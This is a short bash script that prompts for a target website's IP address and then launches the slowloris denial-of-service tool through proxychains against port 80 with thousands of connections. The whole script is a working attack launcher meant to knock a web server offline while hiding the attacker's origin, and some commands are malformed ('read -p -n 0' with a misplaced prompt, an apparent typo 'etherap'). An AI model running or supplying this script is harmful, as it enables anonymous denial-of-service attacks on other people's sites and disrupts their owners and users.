#!/bin/bash

# Get the IP of the web
read -p -n 0 "The first is search the IP with ping -c domain.com"
read -p -n 0 "Now put the IP in the next line"
echo 
echo
echo ========================================
read -p "What is the IP domain?: " IP
echo
echo ========================================
echo
echo
# Run

echo "You can leave now with ctrl+c"
read -p -n 0 "Press a key and shot!"
# Use slowloris with proxychains for do a dns to the IP, send every two seconds 6000 packages
# for the port 80, using the protocol 2.
etherap &&
proxychains perl slowloris.pl -dns $IP -timeout 2 -num 6000 -port 80 -tcpto 2